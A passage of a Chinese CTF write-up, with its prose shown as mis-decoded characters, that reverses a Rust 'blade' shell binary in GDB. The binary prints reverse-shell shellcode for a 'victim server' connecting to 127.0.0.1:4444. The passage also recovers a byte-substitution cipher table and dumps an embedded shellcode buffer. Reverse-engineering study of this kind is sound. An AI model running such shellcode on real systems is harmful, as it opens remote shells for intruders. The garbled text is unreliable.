å¯†å¾Œï¼Œå¤–éƒ¨å¾ªç’°å‰ï¼Œå¾ IDA å·¦å´çš„è™›ç·šå¯ä»¥å¾ˆæ–¹ä¾¿åœ°å»åˆ¤æ–·è¿´åœˆæ¶æ§‹ï¼š</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/blade_enc.png"                      alt="enc"                ><br>é¸æ“‡ä¸‹åœ¨ <code>cmp     r13d, 100h</code> çš„ä½ç½®ï¼Œä¹Ÿå°±æ˜¯ <code>seccomp_shell::shell::verify::h898bf5fa26dafbab + 42E</code>ã€‚</p><ul><li>GDB å‹•æ…‹åˆ†æï¼š<br>æ“ä½œå¤§éƒ¨åˆ†å’Œå‰é¢é¡ä¼¼ï¼Œå€¼å¾—ä¸€é¡Œçš„æ˜¯åŠ å¯†å¾Œçš„ flag æœƒæœ‰ä¸å¯è¦–å­—å…ƒï¼Œæ‰€ä»¥é€™è£¡æ›æˆåå…­é€²ä½é¡¯ç¤ºï¼š<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">â””â”€$ gdb -q ./blade</span><br><span class="line">gefâ¤  starti</span><br><span class="line">gefâ¤  <span class="built_in">break</span> *_ZN13seccomp_shell5shell6verify17h898bf5fa26dafbabE + 0x42E</span><br><span class="line">Breakpoint 1 at 0x55555556709e</span><br><span class="line">gefâ¤  <span class="built_in">continue</span></span><br><span class="line">Continuing.</span><br><span class="line">&gt; server</span><br><span class="line">[!] SYS_socket and SYS_connect should be allowed</span><br><span class="line">server&gt; run</span><br><span class="line">[*] Run the following shellcode on the victim server:</span><br><span class="line"><span class="string">&quot;\xeb\x10\x31\xc0\x53\x5f\x49\x8d\x77\x10\x48\x31\xd2\x80\xc2\xff\x0f\x05\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x50\x5b\x48\x97\x68\x7f\x00\x00\x01\x66\x68\x11\x5c\x66\x6a\x02\x54\x5e\xb2\x10\xb0\x2a\x0f\x05\x4c\x8d\x3d\xc5\xff\xff\xff\x41\xff\xe7&quot;</span></span><br><span class="line">[*] Waiting <span class="keyword">for</span> connection on 127.0.0.1:4444</span><br><span class="line"><span class="comment"># ./shellcode</span></span><br><span class="line">[+] Connection established from 127.0.0.1:56514</span><br><span class="line">$ flag 1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#123;&#125;</span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x000055555556709e <span class="keyword">in</span> seccomp_shell::shell::verify::h898bf5fa26dafbab ()</span><br><span class="line">gefâ¤  x/s <span class="variable">$rbx</span></span><br><span class="line">0x5555555d63e0: <span class="string">&quot;\223\377;\330jd\237\n\331\f\354\263\302X\253\255\217&quot;</span>, &lt;incomplete sequence \340&gt;</span><br><span class="line">gefâ¤  x/64xb <span class="variable">$rbx</span></span><br><span class="line">0x5555555d63e0: 0x93    0xff    0x3b    0xd8    0x6a    0x64    0x9f    0x0a</span><br><span class="line">0x5555555d63e8: 0xd9    0x0c    0xec    0xb3    0xc2    0x58    0xab    0xad</span><br><span class="line">0x5555555d63f0: 0x8f    0xe0    0x00    0x1e    0x2d    0x39    0x6b    0x6c</span><br><span class="line">0x5555555d63f8: 0x81    0xe1    0x5b    0xaf    0x9c    0x09    0x04    0xa0</span><br><span class="line">0x5555555d6400: 0x32    0x7e    0x79    0x03    0xcb    0x71    0x75    0x61</span><br><span class="line">0x5555555d6408: 0xfd    0xc1    0xef    0x2e    0x14    0x0b    0x66    0xca</span><br><span class="line">0x5555555d6410: 0xa4    0xa2    0xee    0x97    0x3a    0xb7    0x0f    0x86</span><br><span class="line">0x5555555d6418: 0x99    0x74    0xed    0xd2    0x02    0x1c    0xda    0xe2</span><br></pre></td></tr></table></figure></div>æ‹¿åˆ°åŠ å¯†çš„æ˜ å°„è¡¨äº†ï¼Œä½†åªæœ‰ä¸€éƒ¨åˆ†ã€‚æˆ‘å€‘å¯ä»¥é€é GDB çš„åŠŸèƒ½ç›´æ¥è¨­å®šæ›ä½å¾ŒåŠ å¯†å‰çš„ flag ç‚ºç‰¹å®šçš„å€¼ï¼Œç„¶å¾Œé‡è¤‡ç›´åˆ°å»ºç«‹å®Œæ•´çš„æ˜ å°„è¡¨ï¼Œå…¶ä¸­è¨­ç‰¹å®šå€¼çš„éƒ¨åˆ†ä¹Ÿå¯ä»¥ç”¨ GDB çš„ python API ä¾†å”åŠ©å®Œæˆï¼Œåšæ³•å¦‚ä¸‹ï¼š<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">gefâ¤  <span class="built_in">break</span> *_ZN13seccomp_shell5shell6verify17h898bf5fa26dafbabE + 0x3A7</span><br><span class="line">Breakpoint 1 at 0x555555567017</span><br><span class="line">gefâ¤  <span class="built_in">break</span> *_ZN13seccomp_shell5shell6verify17h898bf5fa26dafbabE + 0x42E</span><br><span class="line">Breakpoint 2 at 0x55555556709e</span><br><span class="line">gefâ¤  python</span><br><span class="line">&gt;start_addr = gdb.parse_and_eval(<span class="string">&quot;<span class="variable">$rbx</span>&quot;</span>)</span><br><span class="line">&gt;bytes_to_write = bytes(range(64))</span><br><span class="line">&gt;gdb.selected_inferior().write_memory(start_addr, bytes_to_write)</span><br><span class="line">&gt;end</span><br><span class="line">gefâ¤  x/64xb <span class="variable">$rbx</span></span><br><span class="line">0x5555555d63e0: 0x00    0x01    0x02    0x03    0x04    0x05    0x06    0x07</span><br><span class="line">0x5555555d63e8: 0x08    0x09    0x0a    0x0b    0x0c    0x0d    0x0e    0x0f</span><br><span class="line">0x5555555d63f0: 0x10    0x11    0x12    0x13    0x14    0x15    0x16    0x17</span><br><span class="line">0x5555555d63f8: 0x18    0x19    0x1a    0x1b    0x1c    0x1d    0x1e    0x1f</span><br><span class="line">0x5555555d6400: 0x20    0x21    0x22    0x23    0x24    0x25    0x26    0x27</span><br><span class="line">0x5555555d6408: 0x28    0x29    0x2a    0x2b    0x2c    0x2d    0x2e    0x2f</span><br><span class="line">0x5555555d6410: 0x30    0x31    0x32    0x33    0x34    0x35    0x36    0x37</span><br><span class="line">0x5555555d6418: 0x38    0x39    0x3a    0x3b    0x3c    0x3d    0x3e    0x3f</span><br><span class="line">gefâ¤  <span class="built_in">continue</span></span><br><span class="line">Continuing.</span><br><span class="line"></span><br><span class="line">Breakpoint 2, 0x000055555556709e <span class="keyword">in</span> seccomp_shell::shell::verify::h898bf5fa26dafbab ()</span><br><span class="line">gefâ¤  x/64xb <span class="variable">$rbx</span></span><br><span class="line">0x5555555d63e0: 0xfb    0x7b    0x4e    0xbb    0x51    0x15    0x8d    0xdb</span><br><span class="line">0x5555555d63e8: 0xb0    0xac    0xa5    0x8e    0xaa    0xb2    0x60    0xeb</span><br><span class="line">0x5555555d63f0: 0x63    0x5c    0xde    0x42    0x2b    0xc6    0xa6    0x35</span><br><span class="line">0x5555555d63f8: 0x30    0x43    0xd6    0x5f    0xbd    0x24    0xb1    0xe3</span><br><span class="line">0x5555555d6400: 0x8c    0xa7    0xd5    0x2a    0x7c    0x6d    0x8b    0x17</span><br><span class="line">0x5555555d6408: 0x9d    0x83    0xfe    0x69    0x10    0x59    0xa9    0x9e</span><br><span class="line">0x5555555d6410: 0x0f    0x1c    0x66    0x97    0x5b    0x61    0xed    0xad</span><br><span class="line">0x5555555d6418: 0xe0    0xda    0x27    0x06    0x25    0xdc    0x5e    0xe7</span><br></pre></td></tr></table></figure></div>ä¸Šé¢çš„æ“ä½œé‡è¤‡ <code>256/64 = 4</code> æ¬¡å³å¯å¾—åˆ°å®Œæ•´çš„åŠ å¯†æ˜ å°„è¡¨ï¼Œç”¨ python ä¾†å”åŠ©æˆ‘å€‘ parse string é‚„æœ‰å»ºç«‹æ˜ å°„ï¼š<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line">plain_string = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">0x5555555d63e0: 0x00    0x01    0x02    0x03    0x04    0x05    0x06    0x07</span></span><br><span class="line"><span class="string">0x5555555d63e8: 0x08    0x09    0x0a    0x0b    0x0c    0x0d    0x0e    0x0f</span></span><br><span class="line"><span class="string">0x5555555d63f0: 0x10    0x11    0x12    0x13    0x14    0x15    0x16    0x17</span></span><br><span class="line"><span class="string">0x5555555d63f8: 0x18    0x19    0x1a    0x1b    0x1c    0x1d    0x1e    0x1f</span></span><br><span class="line"><span class="string">0x5555555d6400: 0x20    0x21    0x22    0x23    0x24    0x25    0x26    0x27</span></span><br><span class="line"><span class="string">0x5555555d6408: 0x28    0x29    0x2a    0x2b    0x2c    0x2d    0x2e    0x2f</span></span><br><span class="line"><span class="string">0x5555555d6410: 0x30    0x31    0x32    0x33    0x34    0x35    0x36    0x37</span></span><br><span class="line"><span class="string">0x5555555d6418: 0x38    0x39    0x3a    0x3b    0x3c    0x3d    0x3e    0x3f</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x5555555d63e0: 0x40    0x41    0x42    0x43    0x44    0x45    0x46    0x47</span></span><br><span class="line"><span class="string">0x5555555d63e8: 0x48    0x49    0x4a    0x4b    0x4c    0x4d    0x4e    0x4f</span></span><br><span class="line"><span class="string">0x5555555d63f0: 0x50    0x51    0x52    0x53    0x54    0x55    0x56    0x57</span></span><br><span class="line"><span class="string">0x5555555d63f8: 0x58    0x59    0x5a    0x5b    0x5c    0x5d    0x5e    0x5f</span></span><br><span class="line"><span class="string">0x5555555d6400: 0x60    0x61    0x62    0x63    0x64    0x65    0x66    0x67</span></span><br><span class="line"><span class="string">0x5555555d6408: 0x68    0x69    0x6a    0x6b    0x6c    0x6d    0x6e    0x6f</span></span><br><span class="line"><span class="string">0x5555555d6410: 0x70    0x71    0x72    0x73    0x74    0x75    0x76    0x77</span></span><br><span class="line"><span class="string">0x5555555d6418: 0x78    0x79    0x7a    0x7b    0x7c    0x7d    0x7e    0x7f</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x5555555d63e0: 0x80    0x81    0x82    0x83    0x84    0x85    0x86    0x87</span></span><br><span class="line"><span class="string">0x5555555d63e8: 0x88    0x89    0x8a    0x8b    0x8c    0x8d    0x8e    0x8f</span></span><br><span class="line"><span class="string">0x5555555d63f0: 0x90    0x91    0x92    0x93    0x94    0x95    0x96    0x97</span></span><br><span class="line"><span class="string">0x5555555d63f8: 0x98    0x99    0x9a    0x9b    0x9c    0x9d    0x9e    0x9f</span></span><br><span class="line"><span class="string">0x5555555d6400: 0xa0    0xa1    0xa2    0xa3    0xa4    0xa5    0xa6    0xa7</span></span><br><span class="line"><span class="string">0x5555555d6408: 0xa8    0xa9    0xaa    0xab    0xac    0xad    0xae    0xaf</span></span><br><span class="line"><span class="string">0x5555555d6410: 0xb0    0xb1    0xb2    0xb3    0xb4    0xb5    0xb6    0xb7</span></span><br><span class="line"><span class="string">0x5555555d6418: 0xb8    0xb9    0xba    0xbb    0xbc    0xbd    0xbe    0xbf</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x5555555d63e0: 0xc0    0xc1    0xc2    0xc3    0xc4    0xc5    0xc6    0xc7</span></span><br><span class="line"><span class="string">0x5555555d63e8: 0xc8    0xc9    0xca    0xcb    0xcc    0xcd    0xce    0xcf</span></span><br><span class="line"><span class="string">0x5555555d63f0: 0xd0    0xd1    0xd2    0xd3    0xd4    0xd5    0xd6    0xd7</span></span><br><span class="line"><span class="string">0x5555555d63f8: 0xd8    0xd9    0xda    0xdb    0xdc    0xdd    0xde    0xdf</span></span><br><span class="line"><span class="string">0x5555555d6400: 0xe0    0xe1    0xe2    0xe3    0xe4    0xe5    0xe6    0xe7</span></span><br><span class="line"><span class="string">0x5555555d6408: 0xe8    0xe9    0xea    0xeb    0xec    0xed    0xee    0xef</span></span><br><span class="line"><span class="string">0x5555555d6410: 0xf0    0xf1    0xf2    0xf3    0xf4    0xf5    0xf6    0xf7</span></span><br><span class="line"><span class="string">0x5555555d6418: 0xf8    0xf9    0xfa    0xfb    0xfc    0xfd    0xfe    0xff</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">encrypted_string = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">0x5555555d63e0: 0xfb    0x7b    0x4e    0xbb    0x51    0x15    0x8d    0xdb</span></span><br><span class="line"><span class="string">0x5555555d63e8: 0xb0    0xac    0xa5    0x8e    0xaa    0xb2    0x60    0xeb</span></span><br><span class="line"><span class="string">0x5555555d63f0: 0x63    0x5c    0xde    0x42    0x2b    0xc6    0xa6    0x35</span></span><br><span class="line"><span class="string">0x5555555d63f8: 0x30    0x43    0xd6    0x5f    0xbd    0x24    0xb1    0xe3</span></span><br><span class="line"><span class="string">0x5555555d6400: 0x8c    0xa7    0xd5    0x2a    0x7c    0x6d    0x8b    0x17</span></span><br><span class="line"><span class="string">0x5555555d6408: 0x9d    0x83    0xfe    0x69    0x10    0x59    0xa9    0x9e</span></span><br><span class="line"><span class="string">0x5555555d6410: 0x0f    0x1c    0x66    0x97    0x5b    0x61    0xed    0xad</span></span><br><span class="line"><span class="string">0x5555555d6418: 0xe0    0xda    0x27    0x06    0x25    0xdc    0x5e    0xe7</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x5555555d63e0: 0x41    0x32    0xd2    0xd9    0x8f    0xee    0xaf    0x03</span></span><br><span class="line"><span class="string">0x5555555d63e8: 0x93    0x3a    0x00    0xa2    0xe1    0xb3    0xec    0x81</span></span><br><span class="line"><span class="string">0x5555555d63f0: 0x9f    0xca    0x58    0xb7    0x79    0xfd    0x3b    0xa0</span></span><br><span class="line"><span class="string">0x5555555d63f8: 0x02    0x0c    0xcb    0xa8    0x80    0xc0    0x16    0x4d</span></span><br><span class="line"><span class="string">0x5555555d6400: 0x2f    0x75    0x71    0x0a    0x04    0x39    0xff    0xc1</span></span><br><span class="line"><span class="string">0x5555555d6408: 0x9c    0xab    0xef    0xa4    0xd8    0xe2    0x14    0xc2</span></span><br><span class="line"><span class="string">0x5555555d6410: 0x6c    0x64    0x1e    0x6b    0x7e    0x99    0x2e    0x09</span></span><br><span class="line"><span class="string">0x5555555d6418: 0x0b    0x86    0x74    0x6a    0xc4    0x2d    0x4f    0xf9</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x5555555d63e0: 0xfa    0x94    0xb6    0x1f    0x89    0x6f    0x5d    0xe8</span></span><br><span class="line"><span class="string">0x5555555d63e8: 0xea    0xb5    0x5a    0x65    0x88    0xc5    0x7f    0x77</span></span><br><span class="line"><span class="string">0x5555555d63f0: 0x11    0xcf    0xf1    0x1b    0x3f    0xf4    0x48    0x47</span></span><br><span class="line"><span class="string">0x5555555d63f8: 0x12    0xe4    0xba    0xdf    0xe9    0x62    0x6e    0xb4</span></span><br><span class="line"><span class="string">0x5555555d6400: 0x96    0xcd    0x13    0x53    0x4b    0x28    0xd7    0xd1</span></span><br><span class="line"><span class="string">0x5555555d6408: 0x33    0xb8    0xe6    0x7a    0x2c    0x9b    0x29    0x44</span></span><br><span class="line"><span class="string">0x5555555d6410: 0x52    0xf7    0x20    0xf2    0x31    0xd3    0xb9    0x40</span></span><br><span class="line"><span class="string">0x5555555d6418: 0xd0    0x34    0xf5    0x54    0x1a    0x01    0xa1    0x92</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x5555555d63e0: 0xfc    0x85    0x07    0xbe    0xdd    0xbc    0x19    0xf3</span></span><br><span class="line"><span class="string">0x5555555d63e8: 0x36    0xf6    0x72    0x98    0x4c    0x7d    0xc7    0xd4</span></span><br><span class="line"><span class="string">0x5555555d63f0: 0x45    0x4a    0x9a    0xc3    0x8a    0xe5    0x50    0x46</span></span><br><span class="line"><span class="string">0x5555555d63f8: 0xcc    0x68    0x76    0x67    0xc9    0x0e    0x3c    0x57</span></span><br><span class="line"><span class="string">0x5555555d6400: 0xf0    0x22    0xbf    0x26    0x84    0x0d    0x90    0xa3</span></span><br><span class="line"><span class="string">0x5555555d6408: 0xae    0x3d    0x1d    0xc8    0x91    0x05    0x87    0x70</span></span><br><span class="line"><span class="string">0x5555555d6410: 0x08    0x73    0x21    0x49    0x55    0x3e    0x37    0x23</span></span><br><span class="line"><span class="string">0x5555555d6418: 0x18    0x56    0xce    0x82    0x38    0x95    0x78    0xf8</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse_memory_dump</span>(<span class="params">dump</span>):</span><br><span class="line">    bytes_list = []</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> dump.strip().split(<span class="string">&#x27;\n&#x27;</span>):</span><br><span class="line">        parts = line.split(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(parts) &lt; <span class="number">2</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        byte_strs = parts[<span class="number">1</span>].split()</span><br><span class="line">        <span class="keyword">for</span> byte_str <span class="keyword">in</span> byte_strs:</span><br><span class="line">            bytes_list.append(<span class="built_in">int</span>(byte_str.strip(), <span class="number">16</span>))</span><br><span class="line">    <span class="keyword">return</span> bytes_list</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">plain_bytes = parse_memory_dump(plain_string)</span><br><span class="line">encrypted_bytes = parse_memory_dump(encrypted_string)</span><br><span class="line"></span><br><span class="line">encryption_mapping = &#123;plain: encrypted <span class="keyword">for</span> plain, encrypted <span class="keyword">in</span> <span class="built_in">zip</span>(plain_bytes, encrypted_bytes)&#125;</span><br><span class="line">decryption_mapping = &#123;encrypted: plain <span class="keyword">for</span> plain, encrypted <span class="keyword">in</span> <span class="built_in">zip</span>(plain_bytes, encrypted_bytes)&#125;</span><br></pre></td></tr></table></figure></div>è®šã€‚åˆ°é€™é‚Šæˆ‘å€‘å·²ç¶“å¯ä»¥å®Œå…¨æ¨¡æ“¬å®ƒå°è¼¸å…¥çš„æ‰€æœ‰æ“ä½œäº†ã€‚<br>ä¸éæœ‰å€‹å¤§å•é¡Œï¼šé€™é¡Œæ˜¯ä¸€å€‹ flag checkerï¼Œå¯æ˜¯å‰›å‰›å‰é¢æˆ‘å€‘å·²ç¶“ç”¨ IDA æŠŠ <code>verify()</code> æ•´å€‹çœ‹éä¸€éä¹Ÿæ²’ç™¼ç¾ä»»ä½•åœ¨æª¢æŸ¥ flag çš„éƒ¨åˆ†ï¼Œåªçœ‹åˆ°ä»–å¯«äº† 255 å€‹ bytes åˆ°ä¸€å¡Šæ–°çš„ç©ºé–“é‚„æœ‰å¯« 64 å€‹ bytes åˆ° <code>dest</code>ï¼Œé‚„æœ‰ä¸€äº› TCP çš„æ“ä½œï¼Œä½†å°±ä¸çŸ¥é“ä»–å¾Œé¢åœ¨å¿™ä»€éº¼QQ<br>å¾Œä¾†çœ‹äº†å…¶ä»–äººçš„ writeup å¾Œç™¼ç¾åŸä¾†å¯«å…¥çš„ 255 byets æ˜¯ä¸€æ®µ shellcodeï¼Œé‚£é€™æ¨£æˆ‘å€‘å¯ä»¥ç”¨ <code>pwntool.disasm</code> ä¾†å”åŠ©æˆ‘å€‘åˆ†æé€™æ®µ shellcodeï¼Œgogoã€‚</li></ul><ol><li>Shellcode 2 Assembly</li></ol><ul><li>ä¸‹æ–·é»</li></ul><p>æˆ‘å€‘æŠŠæ–·é»ä¸‹åœ¨å‰› call å®Œå¯«å…¥ shellcode çš„åœ°æ–¹ï¼Œç„¶å¾Œå› ç‚ºå‰é¢å‰› <code>alloc()</code> ä¸€å¡Šç©ºé–“çµ¦ shellcode æ‰€ä»¥ä½å€å°±æœƒåœ¨ $raxï¼š</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000000130B2                 call    _ZN5alloc7raw_vec19RawVec$LT$T$C$A$GT$11allocate_in17h9362616e9151d1f3E ; alloc::raw_vec::RawVec$LT$T$C$A$GT$::allocate_in::h9362616e9151d1f3</span><br><span class="line">.text:00000000000130B7                 mov     r14, rax</span><br><span class="line">.text:00000000000130BA                 mov     r15, rdx</span><br><span class="line">.text:00000000000130BD                 lea     rsi, unk_62B2B  ; src</span><br><span class="line">.text:00000000000130C4                 mov     edx, 0FFh       ; n</span><br><span class="line">.text:00000000000130C9                 mov     rdi, rax        ; dest</span><br><span class="line">.text:00000000000130CC                 call    cs:memcpy_ptr</span><br><span class="line">.text:00000000000130D2                 mov     [rsp+288h+memoryBuffer], r14</span><br></pre></td></tr></table></figure></div><p>ä¹Ÿå°±æ˜¯ <code>mov     [rsp+288h+memoryBuffer], r14</code>ã€‚</p><ul><li>GDB dump shellcode<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">gefâ¤  <span class="built_in">break</span> *_ZN13seccomp_shell5shell6verify17h898bf5fa26dafbabE + 0x462</span><br><span class="line">Breakpoint 4 at 0x5555555670d2</span><br><span class="line">gefâ¤  <span class="built_in">continue</span></span><br><span class="line">Continuing.</span><br><span class="line">&gt; server</span><br><span class="line">[!] SYS_socket and SYS_connect should be allowed</span><br><span class="line">server&gt; run</span><br><span class="line">[*] Run the following shellcode on the victim server:</span><br><span class="line"><span class="string">&quot;\xeb\x10\x31\xc0\x53\x5f\x49\x8d\x77\x10\x48\x31\xd2\x80\xc2\xff\x0f\x05\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x50\x5b\x48\x97\x68\x7f\x00\x00\x01\x66\x68\x11\x5c\x66\x6a\x02\x54\x5e\xb2\x10\xb0\x2a\x0f\x05\x4c\x8d\x3d\xc5\xff\xff\xff\x41\xff\xe7&quot;</span></span><br><span class="line">[*] Waiting <span class="keyword">for</span> connection on 127.0.0.1:4444</span><br><span class="line">[+] Connection established from 127.0.0.1:56746</span><br><span class="line">$ flag 1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#123;&#125;</span><br><span class="line"></span><br><span class="line">Breakpoint 4, 0x00005555555670d2 <span class="keyword">in</span> seccomp_shell::shell::verify::h898bf5fa26dafbab ()</span><br><span class="line">gefâ¤  x/255xb <span class="variable">$rax</span></span><br><span class="line">0x5555555d6430: 0x54    0x5d    0x31    0xf6    0x48    0xb9    0xa1    0x57</span><br><span class="line">0x5555555d6438: 0x06    0xb8    0x62    0x3a    0x9f    0x37    0x48    0xba</span><br><span class="line">0x5555555d6440: 0x8e    0x35    0x6f    0xd6    0x4d    0x49    0xf7    0x37</span><br><span class="line">0x5555555d6448: 0x48    0x31    0xd1    0x51    0x54    0x5f    0x6a    0x02</span><br><span class="line">0x5555555d6450: 0x58    0x99    0x0f    0x05    0x48    0x97    0x31    0xc0</span><br><span class="line">0x5555555d6458: 0x50    0x54    0x5e    0x6a    0x04    0x5a    0x0f    0x05</span><br><span class="line">0x5555555d6460: 0x41    0x5c    0x6a    0x03    0x58    0x0f    0x05    0x31</span><br><span class="line">0x5555555d6468: 0xf6    0x48    0xb9    0x3b    0x3b    0x6f    0xc3    0x63</span><br><span class="line">0x5555555d6470: 0x64    0xc0    0xaa    0x48    0xba    0x48    0x4c    0x0b</span><br><span class="line">0x5555555d6478: 0xc3    0x63    0x64    0xc0    0xaa    0x48    0x31    0xd1</span><br><span class="line">0x5555555d6480: 0x51    0x48    0xb9    0x8c    0x57    0x82    0x75    0xd6</span><br><span class="line">0x5555555d6488: 0xf8    0xa9    0x7d    0x48    0xba    0xa3    0x32    0xf6</span><br><span class="line">0x5555555d6490: 0x16    0xf9    0x88    0xc8    0x0e    0x48    0x31    0xd1</span><br><span class="line">0x5555555d6498: 0x51    0x54    0x5f    0x6a    0x02    0x58    0x99    0x0f</span><br><span class="line">0x5555555d64a0: 0x05    0x48    0x97    0x31    0xc0    0x50    0x54    0x5e</span><br><span class="line">0x5555555d64a8: 0x6a    0x04    0x5a    0x0f    0x05    0x41    0x5d    0x6a</span><br><span class="line">0x5555555d64b0: 0x03    0x58    0x0f    0x05    0x31    0xf6    0x6a    0x6f</span><br><span class="line">0x5555555d64b8: 0x48    0xb9    0x59    0xe5    0x06    0x0c    0x2d    0xf6</span><br><span class="line">0x5555555d64c0: 0xd9    0x77    0x48    0xba    0x76    0x81    0x63    0x7a</span><br><span class="line">0x5555555d64c8: 0x02    0x8c    0xbc    0x05    0x48    0x31    0xd1    0x51</span><br><span class="line">0x5555555d64d0: 0x54    0x5f    0x6a    0x02    0x58    0x99    0x0f    0x05</span><br><span class="line">0x5555555d64d8: 0x48    0x97    0x31    0xc0    0x50    0x54    0x5e    0x6a</span><br><span class="line">0x5555555d64e0: 0x04    0x5a    0x0f    0x05    0x58    0x48    0xf7    0xd0</span><br><span class="line">0x5555555d64e8: 0x48    0xc1    0xe8    0x1d    0x48    0x99    0x6a    0x29</span><br><span 